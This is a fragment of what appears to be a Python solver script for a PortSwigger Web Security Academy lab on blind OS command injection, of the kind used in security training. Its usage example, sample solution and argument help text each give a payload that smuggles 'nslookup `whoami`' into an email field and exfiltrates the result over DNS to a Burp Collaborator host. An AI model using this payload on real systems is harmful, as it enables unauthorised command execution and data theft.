...
Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test@test.com& nslookup `whoami`.8y719ezk9ecxgtwb8ln2vgk8yz4pse.burpcollaborator.net &" -p 127.0.0.1:8080

Example solutions: test@test.com& nslookup `whoami`.8y719ezk9ecxgtwb8ln2vgk8yz4pse.burpcollaborator.net &
...
parser.add_argument('-c', '--command', help='Command to run, Example: & nslookup `whoami`.8y719ezk9ecxgtwb8ln2vgk8yz4pse.burpcollaborator.net &', required=True)
